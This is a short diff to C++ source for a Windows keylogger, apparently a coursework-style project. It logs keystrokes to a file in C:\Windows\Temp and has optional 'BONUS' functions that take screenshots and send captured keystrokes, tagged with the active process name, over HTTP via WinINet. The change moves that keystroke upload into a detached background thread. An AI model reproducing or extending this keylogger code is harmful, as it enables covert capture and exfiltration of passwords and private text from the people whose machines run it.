@@ -48,7 +48,9 @@ static KeyloggerState g_state;
 static const std::wstring LOG_PATH = L"C:\\Windows\\Temp\\winkey.log";
 
 /**************************************************************************************************************/
+
 #ifdef BONUS
+
 void sendRequest(const std::wstring &message)
 {
 
@@ -81,6 +83,7 @@ void sendRequest(const std::wstring &message)
     InternetCloseHandle(hUrl);
     InternetCloseHandle(hInternet);
 }
+
 #endif
 
 FILE *OpenLogFile()
@@ -108,7 +111,9 @@ std::wstring FormatTimestamp(const SYSTEMTIME &st)
                st.wHour, st.wMinute, st.wSecond);
     return buffer;
 }
+
 #ifdef BONUS
+
 bool doScreenshot(const std::wstring fileName)
 {
     HDC hScreen = GetDC(nullptr);
@@ -214,7 +219,9 @@ void FlushBuffer(void)
         }
         std::wstring keystrokesContent = contentStream.str();
 
-        sendRequest(g_state.currentProcessName + L" : " + keystrokesContent);
+        std::thread([processName, keystrokesContent]() {
+            sendRequest(processName + L" : " + keystrokesContent);
+        }).detach();
     }
     catch (...)
     {
